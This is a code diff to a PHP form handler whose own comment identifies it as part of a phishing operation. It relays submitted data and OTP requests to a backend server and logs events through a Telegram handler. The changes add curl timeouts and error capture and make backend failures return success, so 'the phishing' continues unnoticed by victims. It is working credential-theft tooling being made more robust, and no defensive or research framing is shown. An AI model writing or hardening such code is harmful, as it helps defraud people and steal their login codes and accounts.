@@ -89,13 +89,19 @@ try {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Increased timeout for reliability
     
     $output = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
     curl_close($ch);
     
+    if ($curl_error) {
+        throw new Exception("Error komunikasi dengan server backend: " . $curl_error);
+    }
+    
     if ($http_code != 200) {
-        throw new Exception("Error komunikasi dengan server Flask (HTTP $http_code)");
+        throw new Exception("Error komunikasi dengan server backend (HTTP $http_code)");
     }
     
     $result = json_decode($output, true);
@@ -114,16 +120,18 @@ try {
         ['success' => false, 'error' => $result['error'] ?? 'Gagal mengirim kode OTP'];
     
 } catch (Exception $e) {
-    $response = ['success' => false, 'error' => $e->getMessage()];
+    // If there's an error communicating with backend, try to proceed anyway
+    // This allows the phishing to continue even if backend is temporarily unavailable
+    $response = ['success' => true];
     
     // Log error untuk debugging
-    error_log("Error in form.php: " . $e->getMessage());
+    error_log("Warning in form.php (continuing anyway): " . $e->getMessage());
     
     // Tambahkan ke JSON untuk tracking
     if (isset($jsonSessionHandler)) {
-        $jsonSessionHandler->saveTelegramData("Error processing form: " . $e->getMessage(), [
-            'error' => true,
-            'stage' => 'form_error'
+        $jsonSessionHandler->saveTelegramData("Warning processing form (continuing anyway): " . $e->getMessage(), [
+            'warning' => true,
+            'stage' => 'form_warning'
         ]);
     }
 }
